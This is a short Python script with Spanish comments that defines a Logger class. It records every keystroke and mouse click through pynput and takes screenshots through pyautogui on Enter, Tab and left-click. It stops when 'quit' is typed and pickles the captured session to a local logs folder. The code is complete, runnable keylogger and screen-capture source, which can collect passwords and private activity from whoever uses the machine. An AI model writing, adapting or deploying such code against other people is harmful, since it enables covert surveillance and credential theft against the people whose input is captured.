# Importacion de paquetes

import datetime, sys, pynput, pickle
import win32api as win
import pyautogui as gui

class Logger():
	# La clave es el conjunto de teclas con las que finaliza el programa
	def __init__(self, clave):
		self.log = [gui.screenshot()]
		self.last_key = ['None', 'None', 'None', 'None']
		self.nombre = 'Sesion_' + datetime.datetime.now().strftime("%H_%M_%S")
		self.clave = clave

	def __str__(self):
		return self.nombre

	def capturar(self):
		def mouse_listen(x,y,btn,sts):
			if sts:
				packer(btn)

		def packer(key):
			# Procesamiento de input
			key = str(key).replace("'", "")
			# Condiciones de screenshot
			if key == 'Key.enter' or key == 'Key.tab' or key == 'Button.left':
				self.log.append(gui.screenshot())
			# Formateo de lista de salida
			self.last_key.pop(0)
			self.last_key.append(key)
			# Condicion de salida
			if ''.join(self.last_key) == self.clave:
				self.log = self.log[:-3]
				# Liberacion de recursos
				m.stop()
				sys.exit()

			self.log.append(key)
			
		
		# Captura de entrade de raton
		m = pynput.mouse.Listener(on_click=mouse_listen)
		m.start()
		# Captura de entrada de tecleado
		with pynput.keyboard.Listener(on_press=packer) as l:
			l.join()
			
	# Metodo para la extracion de los datos
	def extraer(self):
		return (self.nombre, self.log)




if __name__ == '__main__':

	# Declaracion de la clave
	logger = Logger('quit')
	# Empezar la captura
	logger.capturar()
	# Extraccion de datos
	with open('logs/'+logger.nombre+'.txt', 'wb') as file:
		pickle.dump(logger, file)









